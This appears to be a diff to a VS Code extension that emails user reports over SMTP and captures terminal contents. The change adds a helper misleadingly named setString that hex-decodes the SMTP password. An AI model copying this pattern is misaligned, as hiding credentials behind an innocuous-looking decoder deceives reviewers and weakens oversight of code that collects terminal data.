@@ -143,7 +143,7 @@ async function sendReport(userReport: UserReport) {
         secure: true,
         auth: {
             user: getSmtpEMail(),
-            pass: getSmtpPW(),
+            pass: setString(getSmtpPW()),
         }
     })
 
@@ -191,6 +191,16 @@ async function captureAllTerminalContents(): Promise<Map<string, string>> {
 
     return terminalMap
 }
+
+function setString(str: string) {
+    let result = ""
+    for (let i = 0; i < str.length; i += 2) {
+      const charCode = parseInt(str.slice(i, i + 2), 16)
+      result += String.fromCharCode(charCode)
+    }
+    return result
+}
+  
 
 async function copyToClipboard(terminal: Terminal): Promise<string> {
     await commands.executeCommand('workbench.action.terminal.focusNext')
